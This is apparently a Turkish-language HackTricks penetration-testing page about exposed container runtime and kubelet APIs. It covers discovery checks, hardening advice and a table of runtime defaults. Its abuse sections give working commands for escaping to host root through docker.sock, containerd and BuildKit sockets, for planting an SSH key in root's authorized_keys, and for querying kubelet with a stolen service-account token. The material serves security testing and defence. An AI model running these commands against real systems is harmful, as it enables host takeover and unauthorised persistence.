# Runtime API'si ve Daemon'ın Açıkta Kalması

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Gerçek dünyadaki birçok container ihlali, namespace kaçışıyla başlamaz. Runtime kontrol düzlemine erişimle başlar. Bir iş yükü, bağlanmış bir Unix socket veya dışarıya açık bir TCP dinleyicisi üzerinden `dockerd`, `containerd`, CRI-O, Podman ya da kubelet ile iletişim kurabiliyorsa saldırgan daha yüksek ayrıcalıklara sahip yeni bir container oluşturmayı, host dosya sistemini bağlamayı, host namespace'lerine katılmayı veya hassas node bilgilerini almayı isteyebilir. Bu durumlarda gerçek güvenlik sınırı runtime API'dir ve bu API'nin ihlali işlevsel olarak host'un ihlal edilmesine yakındır.

Bu nedenle runtime socket'lerinin açığa çıkması, kernel korumalarından ayrı olarak belgelenmelidir. Olağan seccomp, capabilities ve MAC kısıtlamalarına sahip bir container bile, içinde `/var/run/docker.sock` veya `/run/containerd/containerd.sock` bağlıysa host'un ele geçirilmesine tek bir API çağrısı uzaklıkta olabilir. Mevcut container'ın kernel izolasyonu tasarlandığı gibi çalışırken runtime yönetim düzlemi tamamen açıkta kalabilir.

## Daemon Erişim Modelleri

Docker Engine, ayrıcalıklı API'sini geleneksel olarak `unix:///var/run/docker.sock` konumundaki yerel Unix socket'i üzerinden sunar. Tarihsel olarak `tcp://0.0.0.0:2375` gibi TCP dinleyicileri veya TLS korumalı `2376` dinleyicisi üzerinden uzaktan da sunulmuştur. Güçlü TLS ve istemci kimlik doğrulaması olmadan daemon'ı uzaktan erişime açmak, Docker API'sini fiilen uzaktan root arayüzüne dönüştürür.

containerd, CRI-O, Podman ve kubelet de benzer yüksek etkili saldırı yüzeyleri sunar. İsimleri ve iş akışları farklı olsa da mantık değişmez. Arayüz, çağıranın iş yükleri oluşturmasına, host yollarını bağlamasına, kimlik bilgilerini almasına veya çalışan container'ları değiştirmesine izin veriyorsa ayrıcalıklı bir yönetim kanalıdır ve buna göre ele alınmalıdır.

Bir container yönetim web arayüzü, yerel hesaba doğrudan socket erişimi vermeden de aynı güvenlik sınırını açığa çıkarabilir. Örneğin, [Portainer issue #493](https://github.com/portainer/portainer/issues/493), eski bir 1.11.1 sürümünde kimlik doğrulaması gerektirmeyen bir yönetici parolası sıfırlama açığını belgelemiştir. Yerel olarak erişilebilen bir arayüzü yalnızca inceleme için bir ipucu olarak değerlendirin: kurulu sürümü ve kimlik doğrulama davranışını, gerçek yönetici denetimini ve yönetilen uç noktanın yazılabilir bir host bind mount ile container oluşturup oluşturamadığını doğrulayın. [Portainer belgeleri](https://docs.portainer.io/admin/environments/add/docker/socket), socket destekli yönetimin Docker socket'ine erişim gerektirdiğini belirtir; rootless veya kısıtlı bir uç nokta host üzerindeki etkiyi değiştirir. Yalnızca bir işlem adına, porta veya sürüm metnine bakarak kimlik doğrulama açığı ya da host-root erişimi olduğu sonucuna varmayın.

Kontrol etmeye değer yaygın yerel yollar şunlardır:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Daha eski veya daha özelleşmiş yığınlar `dockershim.sock`, `frakti.sock` ya da `rktlet.sock` gibi uç noktaları da açığa çıkarabilir. Bunlar modern ortamlarda daha az yaygındır; ancak karşılaşıldıklarında aynı dikkatle ele alınmalıdır, çünkü sıradan uygulama soketleri değil, runtime denetim yüzeylerini temsil ederler.

## Güvenli Uzaktan Erişim

Bir daemon yerel soketin dışına açılmak zorundaysa bağlantı TLS ile korunmalı ve tercihen karşılıklı kimlik doğrulaması kullanılmalıdır; böylece daemon istemciyi, istemci de daemon’u doğrular. Kolaylık uğruna Docker daemon’unu düz HTTP üzerinden açma alışkanlığı, container yönetimindeki en tehlikeli hatalardan biridir; çünkü API yüzeyi doğrudan ayrıcalıklı container’lar oluşturabilecek kadar güçlüdür.

Tarihsel Docker yapılandırma kalıbı şöyleydi:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

systemd tabanlı host'larda daemon iletişimi `fd://` olarak da görünebilir; bu, sürecin socket'i doğrudan kendisinin bind etmesi yerine systemd'den önceden açılmış bir socket devraldığı anlamına gelir. Önemli olan tam sözdizimi değil, güvenlik açısından doğurduğu sonuçtur. Daemon, sıkı izinlere sahip yerel bir socket'in ötesinde bir yerde dinlemeye başladığı anda transport security ve client authentication artık isteğe bağlı hardening değil, zorunlu hâle gelir.

## Abuse

Bir runtime socket mevcutsa hangisi olduğunu, uyumlu bir client bulunup bulunmadığını ve raw HTTP veya gRPC erişiminin mümkün olup olmadığını doğrulayın:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Bu komutlar; erişilemeyen bir yol, bağlı ancak erişilemeyen bir socket ve çalışan ayrıcalıklı bir API arasındaki farkı anlamak için kullanışlıdır. İstemci başarılı olursa sıradaki soru, API'nin host bind mount veya host namespace paylaşımıyla yeni bir container başlatıp başlatamayacağıdır.

### İstemci Yüklü Olmadığında

`docker`, `podman` veya başka bir kullanışlı CLI'ın bulunmaması, socket'in güvenli olduğu anlamına gelmez. Docker Engine, Unix socket'i üzerinden HTTP konuşur ve Podman, `podman system service` aracılığıyla hem Docker uyumlu bir API hem de Libpod'a özgü bir API sunar. Bu da yalnızca `curl` bulunan minimal bir ortamın daemon'ı yönetmek için yeterli olabileceği anlamına gelir:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Bu, post-exploitation sırasında önemlidir; çünkü savunma ekipleri bazen alışılmış client binary'lerini kaldırırken yönetim socket'ini mount edilmiş halde bırakır. Podman host'larında yüksek değerli yolun rootful ve rootless dağıtımlarda farklı olduğunu unutmayın: rootful service instance'ları için `unix:///run/podman/podman.sock`, rootless olanlar içinse `unix://$XDG_RUNTIME_DIR/podman/podman.sock`.

### Tam Örnek: Docker Socket'inden Host Root'a

`docker.sock` erişilebilirse klasik escape yöntemi, host'un root filesystem'ini mount eden yeni bir container başlatıp ardından içine `chroot` uygulamaktır:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Bu, Docker daemon üzerinden doğrudan host-root yetkileriyle kod çalıştırma olanağı sağlar. Etki yalnızca dosyaları okumakla sınırlı değildir. Yeni container'a girdikten sonra saldırgan host dosyalarını değiştirebilir, kimlik bilgilerini ele geçirebilir, kalıcılık sağlayabilir veya ek ayrıcalıklı iş yükleri başlatabilir.

### Tam Örnek: Docker Socket Üzerinden Host Namespace'lerine

Saldırgan, yalnızca dosya sistemine erişmek yerine namespace'lere girmeyi tercih ederse:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Bu yol, mevcut container’dan yararlanmak yerine runtime’dan host namespace’ine açıkça erişebilen yeni bir container oluşturmasını isteyerek host’a ulaşır.

### Docker Socket Persistence Pattern

Runtime kontrolü, tek seferlik bir shell açmak yerine persistence için de kullanılabilir. Genel yaklaşım; host mount’u olan bir helper container oluşturmak, yetkili erişim bilgilerini veya bir başlangıç hook’unu host’un mount edilmiş dosya sistemine yazmak ve ardından host’un bunları kullandığını doğrulamaktır.

Örnek biçim:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Aynı fikir, operatörün neyi kanıtlamak istediğine bağlı olarak systemd birimlerini, cron parçalarını, uygulama başlangıç dosyalarını veya SSH keys'i hedefleyebilir. Önemli nokta, kalıcı değişikliğin özgün container'da ek ayrıcalıklar kullanılarak değil, runtime daemon'ın host düzeyindeki dosya sistemi yetkisi aracılığıyla yapılmasıdır.

### Raw Docker API Helper Pivot

Docker CLI mevcut olmadığında, aynı host-mount helper akışı Unix socket üzerinden HTTP ile yürütülebilir. Genel akış şöyledir: API'yi doğrulayın, host bind mount içeren bir helper container oluşturun, başlatın, bir exec örneği oluşturun ve bu exec'i başlatın.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Son `/exec/<id>/start` isteği döndürülen exec ID'ye bağlıdır, ancak güvenlik açısından önemli nokta JSON ayrıntılarından bağımsızdır: rootful bir Docker daemon'una ham API erişimi, daha güçlü bir yardımcı workload talep etmek için yeterlidir.

### Tam Örnek: containerd Socket

Bağlanmış bir `containerd` socket'i genellikle en az bunun kadar tehlikelidir:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Daha Docker benzeri bir istemci varsa, `nerdctl`, `--privileged`, `--pid=host` ve `-v` gibi tanıdık bayraklar sunduğu için `ctr`'ye kıyasla daha kullanışlı olabilir:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Etki yine host’un ele geçirilmesidir. Docker’a özgü araçlar bulunmasa bile başka bir runtime API aynı yönetim yetkisini sunabilir. Kubernetes node’larında `crictl`, doğrudan CRI endpoint’iyle iletişim kurduğu için keşif ve container’larla etkileşim kurmaya da yetebilir.

### BuildKit Soketi

İnsanlar `buildkitd`’yi çoğu zaman “yalnızca build backend’i” olarak gördüğünden gözden kaçırmak kolaydır; ancak daemon hâlâ ayrıcalıklı bir control plane’dir. Erişilebilir bir `buildkitd.sock`, saldırganın keyfî build adımları çalıştırmasına, worker yeteneklerini incelemesine, ele geçirilmiş ortamdan yerel context’leri kullanmasına ve daemon bunlara izin verecek şekilde yapılandırılmışsa `network.host` veya `security.insecure` gibi tehlikeli yetkiler istemesine olanak tanıyabilir.

İlk olarak şu etkileşimler yararlıdır:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Daemon build isteklerini kabul ediyorsa, güvensiz entitlement'ların kullanılabilir olup olmadığını test edin:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Etkinin tam kapsamı daemon yapılandırmasına bağlıdır; ancak izinleri geniş rootful BuildKit hizmeti zararsız bir geliştirici kolaylığı değildir. Özellikle CI runner'larında ve paylaşılan build düğümlerinde, bunu yüksek değerli başka bir yönetim yüzeyi olarak değerlendirin.

### TCP Üzerinden Kubelet API'si

Kubelet bir container runtime değildir; ancak yine de düğüm yönetim düzleminin parçasıdır ve genellikle aynı güven sınırı tartışmasının içinde yer alır. Kubelet'in güvenli portu `10250` workload tarafından erişilebiliyorsa veya düğüm kimlik bilgileri, kubeconfig dosyaları ya da proxy izinleri açığa çıkmışsa saldırgan, Kubernetes API sunucusunun admission yoluna hiç dokunmadan Pod'ları listeleyebilir, log'ları alabilir veya düğümdeki container'larda komut çalıştırabilir.

Önce düşük maliyetli keşifle başlayın:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Kubelet veya API-server proxy yolu `exec` yetkisi veriyorsa, WebSocket destekli bir istemci bunu kullanarak node üzerindeki diğer container’larda code execution sağlayabilir. `nodes/proxy` için yalnızca `get` izninin kulağa geldiğinden daha tehlikeli olmasının nedeni de budur: İstek yine de komut çalıştıran kubelet endpoint’lerine ulaşabilir ve kubelet ile doğrudan kurulan bu etkileşimler normal Kubernetes audit log’larında görünmez.<sup>[[2]](#references)</sup>

## Kontroller

Bu kontrollerin amacı, container’ın güven sınırının dışında kalması gereken herhangi bir yönetim düzlemine erişip erişemediğini belirlemektir.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Burada ilginç olanlar:

- Bağlanmış bir runtime soketi, genellikle yalnızca bilgi ifşası değil, doğrudan yönetim yetkisi sağlayan bir araçtır.
- TLS olmayan `2375` TCP listener'ı, uzaktan ele geçirilme durumu olarak değerlendirilmelidir.
- `DOCKER_HOST` gibi ortam değişkenleri, iş yükünün özellikle host runtime'ıyla iletişim kuracak şekilde tasarlandığını çoğu zaman gösterir.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak yerel Unix socket | `dockerd` yerel socket'i dinler ve daemon genellikle rootful çalışır | `/var/run/docker.sock` bağlamak, `tcp://...:2375` adresini dışa açmak, `2376` üzerinde zayıf veya eksik TLS |
| Podman | Varsayılan olarak Daemonless CLI | Sıradan yerel kullanım için uzun süre çalışan ayrıcalıklı bir daemon gerekmez; `podman system service` etkinleştirildiğinde API socket'leri yine de dışa açılabilir | `podman.sock` dışa açmak, servisi geniş kapsamlı çalıştırmak, rootful API kullanımı |
| containerd | Yerel ayrıcalıklı socket | Yönetim API'si yerel socket üzerinden dışa açılır ve genellikle daha üst düzey araçlar tarafından kullanılır | `containerd.sock` bağlamak, geniş kapsamlı `ctr` veya `nerdctl` erişimi, ayrıcalıklı namespace'leri dışa açmak |
| CRI-O | Yerel ayrıcalıklı socket | CRI endpoint'i, yalnızca düğümdeki güvenilir bileşenler için tasarlanmıştır | `crio.sock` bağlamak, CRI endpoint'ini güvenilmeyen iş yüklerine açmak |
| Kubernetes kubelet | Düğümdeki yönetim API'si | Kubelet, Pod'lar tarafından geniş kapsamlı erişilebilir olmamalıdır; kimlik doğrulama ve yetkilendirme ayarlarına bağlı olarak erişim, Pod durumunu, kimlik bilgilerini ve yürütme özelliklerini açığa çıkarabilir | kubelet socket'lerini veya sertifikalarını bağlamak, zayıf kubelet kimlik doğrulaması, host networking ile erişilebilir kubelet endpoint'ini birlikte kullanmak |

## References

- [1] [containerd socket istismarına giriş, bölüm 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server'ı Atlatma Riskleri](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
